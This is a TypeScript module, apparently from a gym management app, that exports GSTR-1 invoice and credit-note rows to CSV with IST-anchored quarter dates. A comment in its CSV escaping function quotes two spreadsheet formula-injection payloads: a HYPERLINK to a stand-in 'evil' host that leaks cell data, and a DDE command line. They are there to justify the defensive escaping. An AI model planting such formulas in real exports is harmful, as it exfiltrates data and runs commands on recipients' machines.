import { prisma } from "@/lib/prisma";
import { getSetting } from "@/lib/services/settings";

export type Gstr1ExportParams = {
  quarter: 1 | 2 | 3 | 4; // Indian fiscal quarter
  year: number; // calendar year of quarter end
  locationId?: number;
};

export type Gstr1Row = {
  invoiceNumber: string;
  invoiceDate: string; // DD-MM-YYYY
  customerName: string;
  customerType: "B2B" | "B2C";
  customerGSTIN: string;
  hsnSacCode: string;
  rate: number;
  taxableValue: number;
  cgst: number;
  sgst: number;
  igst: number;
  totalInvoiceValue: number;
  // R12: 'invoice' for normal sales (B2B/B2CL/B2CS) and 'cdnr' for credit
  // notes (refunds). Credit-note rows have negative taxableValue and negative
  // tax components per GSTR-1 convention, and reference the original
  // invoiceNumber that they reverse.
  documentType?: "invoice" | "cdnr";
  originalInvoiceNumber?: string;
  originalInvoiceDate?: string; // DD-MM-YYYY
};

export type Gstr1Result = {
  rows: Gstr1Row[];
  csv: string;
  meta: {
    quarter: number;
    year: number;
    fromDate: string; // YYYY-MM-DD
    toDate: string; // YYYY-MM-DD
    totalTaxableValue: number;
    totalGst: number;
    isComposition: boolean;
    note?: string;
  };
};

function round2(n: number): number {
  return Math.round(n * 100) / 100;
}

function gstinStateCode(gstin: string | null | undefined): string | null {
  if (!gstin) return null;
  const trimmed = gstin.trim();
  if (trimmed.length < 2) return null;
  return trimmed.slice(0, 2);
}

// All GSTR-1 dates are rendered in IST so that an invoice timestamped at e.g.
// 2026-04-01 02:00 IST (= 2026-03-31 20:30 UTC) is reported as 01-04-2026, not
// 31-03-2026. Server timezone (UTC on Vercel) must not leak into filings.
function toIstParts(d: Date): { yyyy: number; mm: string; dd: string } {
  const ist = new Date(d.getTime() + 5.5 * 3600 * 1000);
  return {
    yyyy: ist.getUTCFullYear(),
    mm: String(ist.getUTCMonth() + 1).padStart(2, "0"),
    dd: String(ist.getUTCDate()).padStart(2, "0"),
  };
}

function fmtDateDDMMYYYY(d: Date): string {
  const { yyyy, mm, dd } = toIstParts(d);
  return `${dd}-${mm}-${yyyy}`;
}

function fmtDateYYYYMMDD(d: Date): string {
  const { yyyy, mm, dd } = toIstParts(d);
  return `${yyyy}-${mm}-${dd}`;
}

/**
 * Build a Date that represents 00:00 IST on the given calendar date.
 * IST is UTC+5:30 with no DST, so 00:00 IST = -5:30 UTC of the same date.
 * (month is 0-indexed per the JS Date convention.)
 *
 * This is critical for GSTR-1 filing: Indian fiscal periods are defined in
 * IST, not in the server timezone. On Vercel (UTC), `new Date(year, month, day)`
 * would build the boundary in UTC and misclassify invoices in the
 * 18:30-00:00 UTC window (= 00:00-05:30 IST of the next calendar day).
 */
function istDateUTC(year: number, month: number, day: number): Date {
  return new Date(Date.UTC(year, month, day) - 5.5 * 3600 * 1000);
}

/**
 * Map an Indian fiscal quarter and the calendar year in which it ENDS to a
 * date range, with bounds anchored to IST (not server-local time).
 *   Q1 (Apr-Jun) — quarter ends in same year
 *   Q2 (Jul-Sep) — quarter ends in same year
 *   Q3 (Oct-Dec) — quarter ends in same year
 *   Q4 (Jan-Mar) — quarter ends in same year (FY started previous calendar year)
 */
function quarterToDateRange(quarter: 1 | 2 | 3 | 4, year: number): {
  from: Date;
  to: Date;
} {
  let fromMonth: number; // 0-indexed
  const fromYear = year;
  switch (quarter) {
    case 1:
      fromMonth = 3; // Apr
      break;
    case 2:
      fromMonth = 6; // Jul
      break;
    case 3:
      fromMonth = 9; // Oct
      break;
    case 4:
      fromMonth = 0; // Jan
      break;
  }
  // [from, to] in IST: 00:00 IST of first day of quarter to 23:59:59.999 IST of last day.
  // Compute `to` as one millisecond before 00:00 IST of the first day of the next quarter.
  // istDateUTC handles month overflow (e.g. month=12 → next year January) via Date.UTC.
  const from = istDateUTC(fromYear, fromMonth, 1);
  const to = new Date(istDateUTC(fromYear, fromMonth + 3, 1).getTime() - 1);
  return { from, to };
}

function csvEscape(value: unknown): string {
  let s = String(value ?? "");
  // PR 13 audit fix (CRITICAL): formula-injection prophylaxis (CWE-1236).
  // GSTR-1 CSVs are routinely re-opened in Excel / Google Sheets / LibreOffice
  // by the gym's CA. A customer name like `=HYPERLINK("http://evil/?c="&A1)`
  // or `=cmd|'/C calc'!A1` would execute on open. Per OWASP guidance, prefix
  // any cell whose first character is one of `= + - @ \t \r` with a single
  // quote so spreadsheet apps treat it as text. The leading apostrophe is
  // not part of the rendered value in the spreadsheet but does add a byte
  // to the CSV — acceptable trade-off for filings that ship to third parties.
  if (s.length > 0 && /^[=+\-@\t\r]/.test(s)) {
    s = `'${s}`;
  }
  if (s.includes(",") || s.includes('"') || s.includes("\n")) {
    return `"${s.replace(/"/g, '""')}"`;
  }
  return s;
}

function rowsToCsv(rows: Gstr1Row[]): string {
  const headers = [
    "Document Type",
    "Invoice Number",
    "Invoice Date",
    "Original Invoice Number",
    "Original Invoice Date",
    "Customer Name",
    "Customer Type",
    "Customer GSTIN",
    "HSN/SAC",
    "Rate (%)",
    "Taxable Value",
    "CGST",
    "SGST",
    "IGST",
    "Total Invoice Value",
  ];
  const lines = [headers.join(",")];
  for (const r of rows) {
    lines.push(
      [
        csvEscape(r.documentType ?? "invoice"),
        csvEscape(r.invoiceNumber),
        csvEscape(r.invoiceDate),
        csvEscape(r.originalInvoiceNumber ?? ""),
        csvEscape(r.originalInvoiceDate ?? ""),
        csvEscape(r.customerName),
        csvEscape(r.customerType),
        csvEscape(r.customerGSTIN),
        csvEscape(r.hsnSacCode),
        csvEscape(r.rate),
        csvEscape(r.taxableValue.toFixed(2)),
        csvEscape(r.cgst.toFixed(2)),
        csvEscape(r.sgst.toFixed(2)),
        csvEscape(r.igst.toFixed(2)),
        csvEscape(r.totalInvoiceValue.toFixed(2)),
      ].join(","),
    );
  }
  return lines.join("\n");
}

export async function exportGstr1(
  params: Gstr1ExportParams,
): Promise<Gstr1Result> {
  const { quarter, year, locationId } = params;
  const { from, to } = quarterToDateRange(quarter, year);

  const [scheme, hsn, gstRateStr, gymGstin] = await Promise.all([
    getSetting("gym_gst_scheme", "regular"),
    getSetting("gym_service_hsn", "999723"),
    getSetting("gym_gst_rate", "18"),
    getSetting("gym_gstin", ""),
  ]);

  const fromDate = fmtDateYYYYMMDD(from);
  const toDate = fmtDateYYYYMMDD(to);

  if (scheme === "composition") {
    return {
      rows: [],
      csv: "",
      meta: {
        quarter,
        year,
        fromDate,
        toDate,
        totalTaxableValue: 0,
        totalGst: 0,
        isComposition: true,
        note:
          "Gym is on the GST composition scheme — file CMP-08 instead of GSTR-1.",
      },
    };
  }

  const gstRate = parseFloat(gstRateStr) || 0;
  const gymStateCode = gstinStateCode(gymGstin);

  const invoices = await prisma.invoice.findMany({
    where: {
      createdAt: { gte: from, lte: to },
      ...(locationId
        ? { payment: { locationId } }
        : {}),
    },
    include: {
      user: true,
      payment: true,
    },
    orderBy: { createdAt: "asc" },
  });

  const rows: Gstr1Row[] = [];
  let totalTaxableValue = 0;
  let totalGst = 0;
  const skippedNonPositiveInvoices: Array<{
    invoiceId: number;
    invoiceNumber: string;
    amount: number;
  }> = [];

  for (const inv of invoices) {
    const totalAmount = inv.payment ? Number(inv.payment.amount) : 0;
    // R12: previously we silently dropped any invoice with totalAmount <= 0,
    // which threw away credit notes. Refunds are now emitted explicitly via
    // the CDNR section below (queried from the Refund table). This guard
    // remains only for genuinely zero/negative INVOICE rows (e.g. a stray
    // adjustment manually keyed in) — log them so they can be investigated
    // rather than silently lost from filings.
    if (totalAmount <= 0) {
      skippedNonPositiveInvoices.push({
        invoiceId: inv.id,
        invoiceNumber: inv.invoiceNumber,
        amount: totalAmount,
      });
      continue;
    }

    const taxableValue = round2(totalAmount / (1 + gstRate / 100));
    const gstTotal = round2(totalAmount - taxableValue);

    const customerGstin = (inv.user.gstin ?? "").trim();
    const customerType: "B2B" | "B2C" = customerGstin ? "B2B" : "B2C";
    const customerStateCode = gstinStateCode(customerGstin);

    let cgst = 0;
    let sgst = 0;
    let igst = 0;
    const isIntraState =
      !customerGstin || !gymStateCode || customerStateCode === gymStateCode;
    if (isIntraState) {
      const half = round2(gstTotal / 2);
      cgst = half;
      sgst = round2(gstTotal - half);
    } else {
      igst = gstTotal;
    }

    const customerName =
      `${inv.user.firstname} ${inv.user.lastname}`.trim() || "Walk-in Customer";

    rows.push({
      invoiceNumber: inv.invoiceNumber,
      invoiceDate: fmtDateDDMMYYYY(inv.createdAt),
      customerName,
      customerType,
      customerGSTIN: customerGstin,
      hsnSacCode: hsn,
      rate: gstRate,
      taxableValue,
      cgst,
      sgst,
      igst,
      totalInvoiceValue: round2(totalAmount),
      documentType: "invoice",
    });

    totalTaxableValue += taxableValue;
    totalGst += gstTotal;
  }

  // R12: CDNR (credit note) section — emit one row per processed refund whose
  // processedAt falls in the period. Map back to the original invoice (via
  // refund.invoice or refund.payment.invoice) to inherit GSTIN / state /
  // place-of-supply. Negative taxable + negative tax components per
  // GSTR-1 CDNR convention.
  const refundsInPeriod = await prisma.refund.findMany({
    where: {
      status: "processed",
      processedAt: { gte: from, lte: to },
      ...(locationId
        ? { payment: { locationId } }
        : {}),
    },
    include: {
      invoice: { include: { user: true } },
      payment: {
        include: {
          invoice: { include: { user: true } },
          user: true,
        },
      },
    },
    orderBy: { processedAt: "asc" },
  });

  const skippedRefunds: Array<{
    refundId: number;
    reason: string;
  }> = [];

  for (const refund of refundsInPeriod) {
    const refundedAmount = Number(refund.amountRefunded ?? 0);
    if (refundedAmount <= 0) continue;

    const origInvoice = refund.invoice ?? refund.payment.invoice;
    const customerUser = origInvoice?.user ?? refund.payment.user;
    if (!origInvoice || !customerUser) {
      // Without an original invoice there's nothing to issue a credit note
      // against — skip and log so it can be reconciled manually.
      skippedRefunds.push({
        refundId: refund.id,
        reason: "no_original_invoice",
      });
      continue;
    }

    const taxableValue = round2(refundedAmount / (1 + gstRate / 100));
    const gstTotal = round2(refundedAmount - taxableValue);

    const customerGstin = (customerUser.gstin ?? "").trim();
    const customerType: "B2B" | "B2C" = customerGstin ? "B2B" : "B2C";
    const customerStateCode = gstinStateCode(customerGstin);

    let cgst = 0;
    let sgst = 0;
    let igst = 0;
    const isIntraState =
      !customerGstin || !gymStateCode || customerStateCode === gymStateCode;
    if (isIntraState) {
      const half = round2(gstTotal / 2);
      cgst = half;
      sgst = round2(gstTotal - half);
    } else {
      igst = gstTotal;
    }

    const customerName =
      `${customerUser.firstname} ${customerUser.lastname}`.trim() ||
      "Walk-in Customer";

    // CDNR document number scheme: CN-<refundId>. GSTN doesn't mandate a
    // specific format; keep it deterministic + collision-free per-gym.
    const cdnrNumber = `CN-${refund.id}`;
    const cdnrDate = fmtDateDDMMYYYY(refund.processedAt ?? refund.createdAt);

    rows.push({
      invoiceNumber: cdnrNumber,
      invoiceDate: cdnrDate,
      customerName,
      customerType,
      customerGSTIN: customerGstin,
      hsnSacCode: hsn,
      rate: gstRate,
      taxableValue: -taxableValue,
      cgst: -cgst,
      sgst: -sgst,
      igst: -igst,
      totalInvoiceValue: -round2(refundedAmount),
      documentType: "cdnr",
      originalInvoiceNumber: origInvoice.invoiceNumber,
      originalInvoiceDate: fmtDateDDMMYYYY(origInvoice.createdAt),
    });

    totalTaxableValue -= taxableValue;
    totalGst -= gstTotal;
  }

  // Best-effort audit trail for skipped rows (non-fatal on failure — we never
  // want filing export to fail just because audit logging hiccups).
  if (skippedNonPositiveInvoices.length > 0 || skippedRefunds.length > 0) {
    try {
      await prisma.auditLog.create({
        data: {
          action: "gstr1_export.skipped_rows",
          status: "warning",
          details: JSON.stringify({
            quarter,
            year,
            fromDate,
            toDate,
            skippedNonPositiveInvoices,
            skippedRefunds,
            note:
              "R12: rows excluded from GSTR-1 export. Non-positive invoices and refunds without an original invoice are skipped — review manually.",
          }),
          actorType: "system",
        },
      });
    } catch {
      // swallow — audit log failure must not block filing export
    }
  }

  return {
    rows,
    csv: rowsToCsv(rows),
    meta: {
      quarter,
      year,
      fromDate,
      toDate,
      totalTaxableValue: round2(totalTaxableValue),
      totalGst: round2(totalGst),
      isComposition: false,
    },
  };
}
